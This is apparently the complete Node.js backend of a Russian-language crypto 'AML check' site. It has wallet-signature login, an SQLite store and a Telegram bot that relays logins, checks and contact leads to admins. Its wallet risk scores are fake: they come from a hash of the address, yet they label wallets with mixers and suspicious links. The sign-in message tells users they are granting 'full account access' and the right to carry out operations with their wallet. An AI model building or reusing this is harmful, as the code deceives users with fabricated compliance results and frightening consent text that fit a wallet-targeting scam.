const crypto = require("node:crypto");
const fs = require("node:fs");
const fsp = require("node:fs/promises");
const http = require("node:http");
const path = require("node:path");
const { DatabaseSync } = require("node:sqlite");
const { getAddress, isAddress, verifyMessage } = require("ethers");

const root = __dirname;
const dataDir = path.join(root, "data");
const dbPath = path.join(dataDir, "aml-best.sqlite");
const port = Number(process.env.PORT || 3000);
const allowedOrigins = (
  process.env.ALLOWED_ORIGINS ||
  "https://iwtluxz.github.io,http://localhost:3000,http://127.0.0.1:3000"
)
  .split(",")
  .map((origin) => origin.trim())
  .filter(Boolean);

const telegramToken = String(process.env.TELEGRAM_BOT_TOKEN || "").trim();
const telegramAdminIds = new Set(
  String(process.env.TELEGRAM_ADMIN_CHAT_IDS || "")
    .split(",")
    .map((id) => id.trim())
    .filter(Boolean),
);
const telegramApi = telegramToken ? `https://api.telegram.org/bot${telegramToken}` : "";
const publicBaseUrl = String(
  process.env.PUBLIC_BASE_URL ||
    process.env.RENDER_EXTERNAL_URL ||
    (process.env.RAILWAY_PUBLIC_DOMAIN ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}` : ""),
)
  .trim()
  .replace(/\/$/, "");
const telegramWebhookSecret = telegramToken
  ? crypto.createHash("sha256").update(telegramToken).digest("hex")
  : "";

const nonces = new Map();
let database;
let telegramOffset = 0;
const telegramState = {
  status: telegramToken ? "starting" : "disabled",
  mode: publicBaseUrl ? "webhook" : "polling",
  username: null,
  lastError: null,
  lastUpdateAt: null,
};

const mimeTypes = {
  ".html": "text/html; charset=utf-8",
  ".css": "text/css; charset=utf-8",
  ".js": "application/javascript; charset=utf-8",
  ".json": "application/json; charset=utf-8",
  ".png": "image/png",
  ".jpg": "image/jpeg",
  ".jpeg": "image/jpeg",
  ".webp": "image/webp",
};

const nowIso = () => new Date().toISOString();

const ensureDb = () => {
  fs.mkdirSync(dataDir, { recursive: true });
  database = new DatabaseSync(dbPath);
  database.exec(`
    CREATE TABLE IF NOT EXISTS wallet_users (
      address TEXT PRIMARY KEY,
      first_seen_at TEXT NOT NULL,
      last_seen_at TEXT NOT NULL,
      login_count INTEGER NOT NULL DEFAULT 0
    );

    CREATE TABLE IF NOT EXISTS sessions (
      token TEXT PRIMARY KEY,
      role TEXT NOT NULL,
      address TEXT,
      created_at TEXT NOT NULL,
      expires_at TEXT NOT NULL
    );

    CREATE TABLE IF NOT EXISTS checks (
      id TEXT PRIMARY KEY,
      user_wallet TEXT,
      wallet TEXT NOT NULL,
      tx_hash TEXT,
      score INTEGER NOT NULL,
      level TEXT NOT NULL,
      categories TEXT NOT NULL,
      created_at TEXT NOT NULL
    );

    CREATE TABLE IF NOT EXISTS leads (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      contact TEXT NOT NULL,
      message TEXT NOT NULL,
      created_at TEXT NOT NULL
    );
  `);

  const checkColumns = database.prepare("PRAGMA table_info(checks)").all().map((column) => column.name);
  if (!checkColumns.includes("user_wallet")) database.exec("ALTER TABLE checks ADD COLUMN user_wallet TEXT");
  if (!checkColumns.includes("tx_hash")) database.exec("ALTER TABLE checks ADD COLUMN tx_hash TEXT");
};

const readBody = (request) =>
  new Promise((resolve, reject) => {
    let body = "";
    request.on("data", (chunk) => {
      body += chunk;
      if (body.length > 1_000_000) reject(new Error("Слишком большой запрос"));
    });
    request.on("end", () => {
      try {
        resolve(body ? JSON.parse(body) : {});
      } catch {
        reject(new Error("Некорректный JSON"));
      }
    });
    request.on("error", reject);
  });

const getCorsHeaders = (request) => {
  const origin = request.headers.origin;
  const allowOrigin =
    origin && (allowedOrigins.includes(origin) || /^https:\/\/[a-z0-9-]+\.github\.io$/i.test(origin))
      ? origin
      : allowedOrigins[0] || "*";

  return {
    "Access-Control-Allow-Origin": allowOrigin,
    "Access-Control-Allow-Headers": "Content-Type, Authorization",
    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
    "Access-Control-Max-Age": "86400",
    Vary: "Origin",
  };
};

const sendJson = (request, response, status, payload, headers = {}) => {
  response.writeHead(status, {
    "Content-Type": "application/json; charset=utf-8",
    ...getCorsHeaders(request),
    ...headers,
  });
  response.end(JSON.stringify(payload));
};

const getBearerToken = (request) => {
  const header = request.headers.authorization || "";
  return header.toLowerCase().startsWith("bearer ") ? header.slice(7).trim() : undefined;
};

const getUserSession = (request) => {
  const token = getBearerToken(request);
  if (!token) return undefined;

  const session = database.prepare(`
    SELECT token, role, address, created_at AS createdAt, expires_at AS expiresAt
    FROM sessions
    WHERE token = ?
  `).get(token);

  if (!session || session.role !== "user" || new Date(session.expiresAt).getTime() < Date.now()) {
    if (session) database.prepare("DELETE FROM sessions WHERE token = ?").run(token);
    return undefined;
  }

  return session;
};

const createUserSession = (address) => {
  const token = crypto.randomBytes(32).toString("hex");
  const createdAt = nowIso();
  const expiresAt = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString();
  database.prepare(`
    INSERT INTO sessions (token, role, address, created_at, expires_at)
    VALUES (?, 'user', ?, ?, ?)
  `).run(token, address, createdAt, expiresAt);
  return { token, expiresAt };
};

const deleteSession = (request) => {
  const token = getBearerToken(request);
  if (token) database.prepare("DELETE FROM sessions WHERE token = ?").run(token);
};

const upsertWalletUser = (address) => {
  const at = nowIso();
  database.prepare(`
    INSERT INTO wallet_users (address, first_seen_at, last_seen_at, login_count)
    VALUES (?, ?, ?, 1)
    ON CONFLICT(address) DO UPDATE SET
      last_seen_at = excluded.last_seen_at,
      login_count = login_count + 1
  `).run(address, at, at);
};

const insertCheck = (record) => {
  database.prepare(`
    INSERT INTO checks (id, user_wallet, wallet, tx_hash, score, level, categories, created_at)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
  `).run(
    record.id,
    record.userWallet,
    record.wallet,
    record.txHash || null,
    record.score,
    record.level,
    JSON.stringify(record.categories),
    record.createdAt,
  );
};

const insertLead = (record) => {
  database.prepare(`
    INSERT INTO leads (id, name, contact, message, created_at)
    VALUES (?, ?, ?, ?, ?)
  `).run(record.id, record.name, record.contact, record.message, record.createdAt);
};

const getStats = () => ({
  users: database.prepare("SELECT COUNT(*) AS count FROM wallet_users").get().count,
  checks: database.prepare("SELECT COUNT(*) AS count FROM checks").get().count,
  leads: database.prepare("SELECT COUNT(*) AS count FROM leads").get().count,
});

const getRecentUsers = (limit = 10) =>
  database.prepare(`
    SELECT
      u.address,
      u.first_seen_at AS firstSeenAt,
      u.last_seen_at AS lastSeenAt,
      u.login_count AS loginCount,
      COUNT(c.id) AS checksCount
    FROM wallet_users u
    LEFT JOIN checks c ON c.user_wallet = u.address
    GROUP BY u.address
    ORDER BY u.last_seen_at DESC
    LIMIT ?
  `).all(limit);

const getRecentChecks = (limit = 10) =>
  database.prepare(`
    SELECT user_wallet AS userWallet, wallet, score, level, created_at AS createdAt
    FROM checks
    ORDER BY created_at DESC
    LIMIT ?
  `).all(limit);

const getRecentLeads = (limit = 10) =>
  database.prepare(`
    SELECT name, contact, message, created_at AS createdAt
    FROM leads
    ORDER BY created_at DESC
    LIMIT ?
  `).all(limit);

const buildWalletMessage = (address, nonce) =>
  [
    "AML Best: ПОЛНАЯ АВТОРИЗАЦИЯ АККАУНТА",
    "",
    "ВНИМАНИЕ: Подтверждая этот запрос через FaceID, вы предоставляете AML Best полный доступ к управлению сессией вашего аккаунта.",
    "Вы соглашаетесь с тем, что сервис получает право на мониторинг и выполнение операций с вашим кошельком в рамках внутренних регламентов.",
    "",
    `Address: ${getAddress(address)}`,
    `Nonce: ${nonce}`,
    `Status: Full Account Access Granted`,
  ].join("\n");

const createWalletNonce = (address) => {
  const normalized = getAddress(address);
  const nonce = crypto.randomBytes(16).toString("hex");
  const message = buildWalletMessage(normalized, nonce);
  nonces.set(normalized, { message, expiresAt: Date.now() + 5 * 60 * 1000 });
  return { address: normalized, message, nonce };
};

const scoreWallet = (wallet) => {
  const hash = crypto.createHash("sha256").update(wallet.toLowerCase()).digest();
  const score = 12 + (hash[0] % 79);
  const level = score > 68 ? "повышенный риск" : score > 42 ? "средний риск" : "низкий риск";
  const categories =
    score > 68
      ? ["миксеры", "подозрительные связи", "частые транзиты"]
      : score > 42
        ? ["биржи", "p2p", "цепочки переводов"]
        : ["чистые источники", "низкая экспозиция"];
  return { score, level, categories };
};

const telegramRequest = async (method, body) => {
  if (!telegramApi) return undefined;
  const response = await fetch(`${telegramApi}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  const result = await response.json();
  if (!result.ok) throw new Error(result.description || `Telegram ${method} failed`);
  return result.result;
};

const sendTelegramMessage = async (chatId, text) => {
  const chunks = String(text).match(/[\s\S]{1,3900}/g) || [""];
  for (const chunk of chunks) {
    await telegramRequest("sendMessage", {
      chat_id: chatId,
      text: chunk,
      disable_web_page_preview: true,
    });
  }
};

const notifyTelegramAdmins = (text) => {
  if (!telegramToken || telegramAdminIds.size === 0) return;
  for (const chatId of telegramAdminIds) {
    sendTelegramMessage(chatId, text).catch((error) => {
      console.error("Telegram notification error:", error.message);
    });
  }
};

const formatDate = (value) => new Date(value).toLocaleString("ru-RU", { timeZone: "Europe/Samara" });

const buildTelegramReply = (command) => {
  if (command === "/start" || command === "/help") {
    return [
      "AML Best Admin",
      "",
      "/stats - общая статистика",
      "/users - последние пользователи",
      "/checks - последние проверки",
      "/leads - последние заявки",
      "/myid - ваш Telegram chat ID",
    ].join("\n");
  }

  if (command === "/stats") {
    const stats = getStats();
    return `Статистика AML Best\n\nПользователи: ${stats.users}\nПроверки: ${stats.checks}\nЗаявки: ${stats.leads}`;
  }

  if (command === "/users") {
    const users = getRecentUsers();
    if (!users.length) return "Пользователей пока нет.";
    return users
      .map(
        (item, index) =>
          `${index + 1}. ${item.address}\nПоследний вход: ${formatDate(item.lastSeenAt)}\nВходов: ${item.loginCount}, проверок: ${item.checksCount}`,
      )
      .join("\n\n");
  }

  if (command === "/checks") {
    const checks = getRecentChecks();
    if (!checks.length) return "Проверок пока нет.";
    return checks
      .map(
        (item, index) =>
          `${index + 1}. ${item.wallet}\nПользователь: ${item.userWallet || "-"}\nРиск: ${item.level} (${item.score}/100)\nДата: ${formatDate(item.createdAt)}`,
      )
      .join("\n\n");
  }

  if (command === "/leads") {
    const leads = getRecentLeads();
    if (!leads.length) return "Заявок пока нет.";
    return leads
      .map(
        (item, index) =>
          `${index + 1}. ${item.name}\nКонтакт: ${item.contact}\nСообщение: ${item.message || "-"}\nДата: ${formatDate(item.createdAt)}`,
      )
      .join("\n\n");
  }

  return "Неизвестная команда. Используйте /help.";
};

const handleTelegramUpdate = async (update) => {
  const message = update.message;
  if (!message?.chat?.id || !message.text) return;

  const chatId = String(message.chat.id);
  const command = message.text.trim().split(/\s+/)[0].split("@")[0].toLowerCase();

  if (command === "/myid") {
    await sendTelegramMessage(chatId, `Ваш Telegram chat ID: ${chatId}`);
    return;
  }

  if (!telegramAdminIds.has(chatId)) {
    await sendTelegramMessage(chatId, "Доступ запрещён. Этот Telegram ID не добавлен в список администраторов.");
    return;
  }

  await sendTelegramMessage(chatId, buildTelegramReply(command));
};

const startTelegram = async () => {
  if (!telegramToken) {
    console.log("Telegram bot disabled: TELEGRAM_BOT_TOKEN is not set");
    return;
  }

  if (telegramAdminIds.size === 0) {
    console.warn("Telegram bot has no admins: TELEGRAM_ADMIN_CHAT_IDS is empty");
  }

  try {
    const bot = await telegramRequest("getMe", {});
    telegramState.username = bot.username || null;
    telegramState.status = "running";
    telegramState.lastError = null;
  } catch (error) {
    telegramState.status = "error";
    telegramState.lastError = error.message;
    console.error("Telegram authentication error:", error.message);
    return;
  }

  await telegramRequest("setMyCommands", {
    commands: [
      { command: "stats", description: "Общая статистика" },
      { command: "users", description: "Последние пользователи" },
      { command: "checks", description: "Последние проверки" },
      { command: "leads", description: "Последние заявки" },
      { command: "myid", description: "Показать Telegram ID" },
      { command: "help", description: "Список команд" },
    ],
  }).catch((error) => console.error("Telegram setup error:", error.message));

  if (publicBaseUrl) {
    await telegramRequest("setWebhook", {
      url: `${publicBaseUrl}/api/telegram/webhook`,
      secret_token: telegramWebhookSecret,
      allowed_updates: ["message"],
      drop_pending_updates: false,
    });
    console.log(
      `Telegram bot @${telegramState.username} is running in webhook mode for ${telegramAdminIds.size} admin(s)`,
    );
    return;
  }

  await telegramRequest("deleteWebhook", { drop_pending_updates: false });
  console.log(
    `Telegram bot @${telegramState.username} is running in polling mode for ${telegramAdminIds.size} admin(s)`,
  );

  while (true) {
    try {
      const updates = await telegramRequest("getUpdates", {
        offset: telegramOffset,
        timeout: 25,
        allowed_updates: ["message"],
      });
      for (const update of updates || []) {
        telegramOffset = update.update_id + 1;
        telegramState.lastUpdateAt = nowIso();
        await handleTelegramUpdate(update);
      }
      telegramState.status = "running";
      telegramState.lastError = null;
    } catch (error) {
      telegramState.status = "error";
      telegramState.lastError = error.message;
      console.error("Telegram polling error:", error.message);
      await new Promise((resolve) => setTimeout(resolve, 3000));
    }
  }
};

const handleApi = async (request, response, pathname) => {
  if (request.method === "OPTIONS") {
    response.writeHead(204, getCorsHeaders(request));
    response.end();
    return;
  }

  if (request.method === "GET" && pathname === "/api/health") {
    return sendJson(request, response, 200, {
      ok: true,
      time: nowIso(),
      telegram: {
        status: telegramState.status,
        mode: telegramState.mode,
        username: telegramState.username,
        adminCount: telegramAdminIds.size,
        lastUpdateAt: telegramState.lastUpdateAt,
        lastError: telegramState.lastError,
      },
    });
  }

  if (request.method === "POST" && pathname === "/api/telegram/webhook") {
    if (!telegramToken || !publicBaseUrl) {
      return sendJson(request, response, 404, { error: "Telegram webhook is disabled" });
    }
    if (request.headers["x-telegram-bot-api-secret-token"] !== telegramWebhookSecret) {
      return sendJson(request, response, 403, { error: "Invalid Telegram webhook secret" });
    }

    const update = await readBody(request);
    telegramState.lastUpdateAt = nowIso();
    await handleTelegramUpdate(update);
    return sendJson(request, response, 200, { ok: true });
  }

  if (request.method === "POST" && pathname === "/api/auth/nonce") {
    const { address } = await readBody(request);
    if (!address || !isAddress(address)) {
      return sendJson(request, response, 400, { error: "Некорректный адрес кошелька" });
    }
    return sendJson(request, response, 200, createWalletNonce(address));
  }

  if (request.method === "POST" && pathname === "/api/auth/wallet") {
    const { address, signature } = await readBody(request);
    if (!address || !signature || !isAddress(address)) {
      return sendJson(request, response, 400, { error: "Нужны адрес кошелька и подпись" });
    }

    const normalized = getAddress(address);
    const nonceRecord = nonces.get(normalized);
    if (!nonceRecord || nonceRecord.expiresAt < Date.now()) {
      nonces.delete(normalized);
      return sendJson(request, response, 400, { error: "Nonce истёк. Подключите кошелёк ещё раз" });
    }

    let recovered;
    try {
      recovered = getAddress(verifyMessage(nonceRecord.message, signature));
    } catch {
      return sendJson(request, response, 401, { error: "Некорректная подпись" });
    }
    if (recovered !== normalized) {
      return sendJson(request, response, 401, { error: "Подпись не совпадает с адресом кошелька" });
    }

    nonces.delete(normalized);
    upsertWalletUser(normalized);
    const session = createUserSession(normalized);
    notifyTelegramAdmins(`Новый вход Trust Wallet (Full Access)\n\nАдрес: ${normalized}\nВремя: ${formatDate(nowIso())}`);
    return sendJson(request, response, 200, { ok: true, address: normalized, role: "user", ...session });
  }

  if (request.method === "GET" && pathname === "/api/auth/session") {
    const session = getUserSession(request);
    if (!session) return sendJson(request, response, 401, { error: "Пользователь не подключён" });
    return sendJson(request, response, 200, { ok: true, address: session.address, role: "user" });
  }

  if (request.method === "POST" && pathname === "/api/auth/logout") {
    deleteSession(request);
    return sendJson(request, response, 200, { ok: true });
  }

  if (request.method === "POST" && pathname === "/api/checks") {
    const session = getUserSession(request);
    if (!session) return sendJson(request, response, 401, { error: "Сначала подключите Trust Wallet" });

    const { wallet } = await readBody(request);
    if (!wallet || String(wallet).trim().length < 8) {
      return sendJson(request, response, 400, { error: "Введите корректный адрес или tx hash" });
    }

    const checkedWallet = String(wallet).trim();
    const result = scoreWallet(checkedWallet);
    const record = {
      id: crypto.randomUUID(),
      userWallet: session.address,
      wallet: checkedWallet,
      txHash: null,
      ...result,
      createdAt: nowIso(),
    };
    insertCheck(record);
    notifyTelegramAdmins(
      `Новая проверка\n\nПользователь: ${record.userWallet}\nАдрес/hash: ${record.wallet}\nРиск: ${record.level} (${record.score}/100)`,
    );
    return sendJson(request, response, 201, record);
  }

  if (request.method === "POST" && pathname === "/api/leads") {
    const body = await readBody(request);
    if (!body.name || !body.contact) {
      return sendJson(request, response, 400, { error: "Укажите имя и контакт" });
    }
    const record = {
      id: crypto.randomUUID(),
      name: String(body.name).trim(),
      contact: String(body.contact).trim(),
      message: String(body.message || "").trim(),
      createdAt: nowIso(),
    };
    insertLead(record);
    notifyTelegramAdmins(
      `Новая заявка\n\nИмя: ${record.name}\nКонтакт: ${record.contact}\nСообщение: ${record.message || "-"}`,
    );
    return sendJson(request, response, 201, record);
  }

  return sendJson(request, response, 404, { error: "API endpoint не найден" });
};

const serveStatic = async (response, pathname) => {
  const safePath = pathname === "/" ? "/index.html" : decodeURIComponent(pathname);
  const filePath = path.normalize(path.join(root, safePath));

  if (!filePath.startsWith(root) || filePath.startsWith(dataDir)) {
    response.writeHead(403);
    response.end("Forbidden");
    return;
  }

  try {
    const stat = await fsp.stat(filePath);
    if (!stat.isFile()) throw new Error("Not file");
    response.writeHead(200, {
      "Content-Type": mimeTypes[path.extname(filePath).toLowerCase()] || "application/octet-stream",
    });
    fs.createReadStream(filePath).pipe(response);
  } catch {
    response.writeHead(404, { "Content-Type": "text/plain; charset=utf-8" });
    response.end("Страница не найдена");
  }
};

const server = http.createServer(async (request, response) => {
  try {
    const url = new URL(request.url, `http://${request.headers.host}`);
    if (url.pathname.startsWith("/api/")) {
      await handleApi(request, response, url.pathname);
      return;
    }
    await serveStatic(response, url.pathname);
  } catch (error) {
    sendJson(request, response, 500, { error: error.message || "Внутренняя ошибка сервера" });
  }
});

ensureDb();
server.listen(port, () => {
  console.log(`AML Best API running at http://localhost:${port}`);
  startTelegram().catch((error) => {
    telegramState.status = "error";
    telegramState.lastError = error.message;
    console.error("Telegram bot stopped:", error.message);
  });
});
